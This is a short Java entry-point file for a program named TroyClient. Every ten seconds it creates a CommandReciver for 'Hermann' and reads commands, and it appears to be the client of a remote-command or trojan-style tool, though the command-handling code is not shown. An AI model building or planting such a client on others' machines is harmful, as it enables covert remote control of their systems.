package ch.lebois.troyclient;

import ch.lebois.troyclient.functions.CommandReciver;

public class TroyClient {
    public static void main(String[] args) throws InterruptedException {
        while (true) {
            Thread.sleep(10000);
            new CommandReciver("Hermann").readCommands();
        }
    }
}
